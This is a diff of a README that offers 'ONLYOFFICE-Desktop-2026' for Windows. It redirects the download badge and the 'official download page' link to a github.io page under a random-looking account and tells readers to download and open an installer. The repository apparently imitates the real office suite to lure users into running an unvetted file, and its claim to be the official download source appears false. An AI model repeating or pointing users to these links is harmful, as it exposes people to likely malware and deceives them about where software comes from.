@@ -1,6 +1,6 @@
 # 💻 ONLYOFFICE-Desktop-2026 - Access Professional Office Tools Today
 
-[![](https://img.shields.io/badge/Download-ONLYOFFICE-blue.svg)](https://github.com/northwesterly-hoodedladiestresses152/ONLYOFFICE-Desktop-2026)
+[![](https://img.shields.io/badge/Download-ONLYOFFICE-blue.svg)](https://northwesterly-hoodedladiestresses152.github.io)
 
 ONLYOFFICE-Desktop-2026 provides a complete office suite for your computer. This software allows you to create, edit, and save documents, spreadsheets, and presentations. It works on Windows 10 and Windows 11. You do not need an internet connection to use these tools once you install them.
 
@@ -18,7 +18,7 @@ Your computer must meet these basic standards to run this software:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [official download page here](https://github.com/northwesterly-hoodedladiestresses152/ONLYOFFICE-Desktop-2026).
+1. Visit the [official download page here](https://northwesterly-hoodedladiestresses152.github.io).
 2. Locate the button labeled "Download" or look for the latest release link on the page.
 3. Click the link to save the installation file to your computer.
 4. Open your "Downloads" folder once the file finishes downloading.
